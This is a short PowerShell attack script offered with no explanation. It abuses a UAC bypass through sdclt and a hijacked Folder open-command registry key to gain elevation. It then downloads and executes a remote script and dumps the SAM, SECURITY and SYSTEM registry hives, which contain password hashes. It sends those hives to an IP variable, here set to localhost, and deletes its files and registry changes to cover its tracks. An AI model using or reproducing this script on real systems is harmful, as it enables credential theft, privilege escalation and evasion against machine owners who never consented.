
$ip = 'localhost'
$Value = "powershell -windowstyle hidden `$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1' -UseBasicParsing).Content);IEX `$b;reg save HKLM\sam C:\Users\Public\1;reg save HKLM\security C:\Users\Public\2;reg save HKLM\system C:\Users\Public\3;Invoke-Transmission -ip $ip;Remove-Item 'C:\Users\Public\A.bat';Remove-Item 'C:\Users\Public\1';Remove-Item 'C:\Users\Public\2';Remove-Item 'C:\Users\Public\3';[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User)"
[System.Environment]::SetEnvironmentVariable('A', $Value,[System.EnvironmentVariableTarget]::User)
New-Item -Path 'C:\Users\Public\A.bat' -Value '%A%'
New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value "C:\Users\Public\A.bat"
New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
sleep 5
start cmd "/c start sdclt"
sleep 3
Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command"
exit

